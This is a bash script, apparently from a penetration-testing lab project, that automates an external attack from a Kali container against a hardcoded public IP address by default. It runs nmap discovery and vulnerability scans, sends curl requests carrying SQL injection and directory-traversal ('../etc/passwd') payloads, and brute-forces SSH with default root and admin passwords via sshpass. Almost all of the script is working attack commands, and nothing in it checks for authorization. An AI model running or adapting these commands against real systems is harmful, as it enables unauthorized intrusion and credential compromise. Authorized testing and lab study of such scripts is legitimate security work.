#!/bin/bash
# External penetration test script
# Performs pentest against external IP addresses

KALI_CONTAINER="pentest-kali"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
OUTPUT_DIR="/root/pentest-results"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

# External target IP
EXTERNAL_IP=${1:-"144.178.248.26"}

echo "=========================================="
echo "External Penetration Test"
echo "Target: $EXTERNAL_IP"
echo "Timestamp: $TIMESTAMP"
echo "=========================================="
echo ""

# Ensure Kali container has required tools
echo "Installing required tools in Kali container..."
docker exec $KALI_CONTAINER sh -c "apt-get update -qq && apt-get install -y -qq nmap hydra sqlmap curl tcpdump 2>&1 | grep -v '^WARNING' || true"

# Check if capture is running
echo "Checking traffic capture status..."
if docker exec pentest-capture sh -c "pgrep tcpdump" > /dev/null 2>&1; then
    echo "  Traffic capture is running"
else
    echo "  WARNING: Traffic capture is not running"
    echo "  Start capture with: ./scripts/capture.sh start"
    read -p "  Continue anyway? (y/n) " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        exit 1
    fi
fi

docker exec $KALI_CONTAINER mkdir -p $OUTPUT_DIR

# Phase 1: Network Discovery
echo ""
echo "Phase 1: Network Discovery"
echo "---------------------------"
echo "Scanning external target: $EXTERNAL_IP"

# Host discovery
echo "  - Host discovery..."
docker exec $KALI_CONTAINER nmap -sn -oX "${OUTPUT_DIR}/external_host_discovery_${EXTERNAL_IP}_${TIMESTAMP}.xml" $EXTERNAL_IP

# Port scan
echo "  - Port scanning..."
docker exec $KALI_CONTAINER nmap -sS -sV -O -p- -oX "${OUTPUT_DIR}/external_port_scan_${EXTERNAL_IP}_${TIMESTAMP}.xml" $EXTERNAL_IP

# Service enumeration
echo "  - Service enumeration..."
docker exec $KALI_CONTAINER nmap -sC -sV -oX "${OUTPUT_DIR}/external_service_enum_${EXTERNAL_IP}_${TIMESTAMP}.xml" $EXTERNAL_IP

# Phase 2: Vulnerability Scanning
echo ""
echo "Phase 2: Vulnerability Scanning"
echo "---------------------------------"
echo "Scanning vulnerabilities on: $EXTERNAL_IP"

# Nmap vulnerability scan
echo "  - Running Nmap vulnerability scripts..."
docker exec $KALI_CONTAINER nmap --script vuln -oX "${OUTPUT_DIR}/external_vuln_scan_${EXTERNAL_IP}_${TIMESTAMP}.xml" $EXTERNAL_IP

# HTTP vulnerability scan (if HTTP detected)
echo "  - Running HTTP vulnerability scans..."
docker exec $KALI_CONTAINER nmap --script http-vuln*,http-enum -p 80,443,8080,8443 -oX "${OUTPUT_DIR}/external_http_vuln_${EXTERNAL_IP}_${TIMESTAMP}.xml" $EXTERNAL_IP 2>/dev/null || true

# Phase 3: Web Application Testing (if web server detected)
echo ""
echo "Phase 3: Web Application Testing"
echo "----------------------------------"
OUTPUT_FILE="${OUTPUT_DIR}/external_web_test_${EXTERNAL_IP}_${TIMESTAMP}.txt"

# Test common web ports
for port in 80 443 8080 8443; do
    echo "  - Testing port $port..."
    
    # Test HTTP/HTTPS
    docker exec $KALI_CONTAINER sh -c "curl -s -k -m 5 http://$EXTERNAL_IP:$port 2>&1" >> "$OUTPUT_FILE" || true
    docker exec $KALI_CONTAINER sh -c "curl -s -k -m 5 https://$EXTERNAL_IP:$port 2>&1" >> "$OUTPUT_FILE" || true
    
    # Test for SQL injection
    docker exec $KALI_CONTAINER sh -c "curl -s -k -m 5 'http://$EXTERNAL_IP:$port/?id=1\\' OR \\'1\\'=\\'1' 2>&1" >> "$OUTPUT_FILE" || true
    
    # Test for directory traversal
    docker exec $KALI_CONTAINER sh -c "curl -s -k -m 5 'http://$EXTERNAL_IP:$port/?file=../etc/passwd' 2>&1" >> "$OUTPUT_FILE" || true
done

# Phase 4: Credential Testing (if applicable)
echo ""
echo "Phase 4: Credential Testing"
echo "----------------------------"
echo "  - Testing common credentials..."

# SSH brute force (if port 22 is open)
SSH_OUTPUT="${OUTPUT_DIR}/external_ssh_test_${EXTERNAL_IP}_${TIMESTAMP}.txt"
docker exec $KALI_CONTAINER sh -c "
for user in root admin administrator; do
    for pass in password admin 123456 root; do
        echo \"Testing: \$user:\$pass\"
        timeout 2 sshpass -p \"\$pass\" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 \$user@$EXTERNAL_IP 'echo SUCCESS' 2>&1
    done
done
" >> "$SSH_OUTPUT" 2>&1 || true

# Step 5: Extract findings from scan results
echo ""
echo "Step 5: Extracting findings from scan results..."
FINDINGS_OUTPUT_DIR="$LAB_DIR/findings"
mkdir -p "$FINDINGS_OUTPUT_DIR"

# Use the improved parsing script to extract findings from XML files
if [ -f "$SCRIPT_DIR/parse-nmap-to-findings.sh" ]; then
    echo "  - Extracting findings from Nmap XML files..."
    if bash "$SCRIPT_DIR/parse-nmap-to-findings.sh" "$EXTERNAL_IP" 2>&1 | grep -q "Extracted"; then
        echo "  ✓ Findings extracted successfully"
    else
        echo "  ⚠ Note: No XML files found or extraction failed"
        echo "  To extract manually: ./scripts/parse-nmap-to-findings.sh $EXTERNAL_IP"
    fi
else
    echo "  ⚠ Note: Extract findings manually: ./scripts/parse-nmap-to-findings.sh $EXTERNAL_IP"
fi

echo ""
echo "=========================================="
echo "External pentest complete!"
echo "Results saved in Kali container at: $OUTPUT_DIR"
echo "Findings exported to: $FINDINGS_OUTPUT_DIR"
echo "=========================================="
echo ""
echo "Summary:"
echo "  - Target: $EXTERNAL_IP"
echo "  - Scan results: ${OUTPUT_DIR}/external_*_${EXTERNAL_IP}_${TIMESTAMP}.*"
echo "  - Findings JSON: ${FINDINGS_OUTPUT_DIR}/findings_${EXTERNAL_IP//\./_}_${TIMESTAMP}.json"
echo ""
echo "Next steps:"
echo "1. Review results: docker exec -it $KALI_CONTAINER ls -la $OUTPUT_DIR"
echo "2. Stop traffic capture: ./scripts/capture.sh stop"
echo "3. Analyze PCAP files: ./scripts/analyze-pcap.sh"
echo "4. Generate report: ./scripts/generate-external-report.sh $EXTERNAL_IP"
